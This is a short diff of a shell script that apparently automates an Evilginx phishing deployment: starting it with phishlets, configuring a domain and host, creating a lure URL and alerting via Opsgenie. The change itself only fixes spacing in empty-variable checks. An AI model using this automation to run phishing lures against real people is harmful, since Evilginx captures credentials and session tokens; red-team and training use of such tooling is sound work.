@@ -204,17 +204,17 @@ fi
 /bin/evilginx -p /app/phishlets/ -developer -debug
 
 # Check if any of the critical values are empty, "", or "none"
-if [ -z "$domain_name"]; then
+if [ -z "$domain_name" ]; then
     echo "Error: 'domain_name' is missing." >&2
     exit 1
 fi
 
-if [ -z "$host_ip"]; then
+if [ -z "$host_ip" ]; then
     echo "Error: 'host_ip' is missing." >&2
     exit 1
 fi
 
-if [ -z "$default_phishlet"]; then
+if [ -z "$default_phishlet" ]; then
     echo "Error: 'default_phishlet' is missing." >&2
     exit 1
 fi
@@ -223,7 +223,7 @@ fi
 setup_evilginx "$domain_name" "$host_ip" "$default_phishlet"
 
 # Check if default_redirect is missing
-if [ -z "$default_redirect"]; then
+if [ -z "$default_redirect" ]; then
     echo "Error: 'default_redirect' is missing." >&2
     exit 1
 fi
@@ -236,7 +236,7 @@ if [[ $? -eq 0 ]]; then
     echo "Lure created successfully: $lure_url"
     
     # Check if opsgenie_api_key is missing
-    if [ -z "$opsgenie_api_key"]; then
+    if [ -z "$opsgenie_api_key" ]; then
         echo "Error: 'opsgenie_api_key' is missing." >&2
     else
         send_opsgenie_alert "$API_KEY" "$API_URL" "$lure_url"
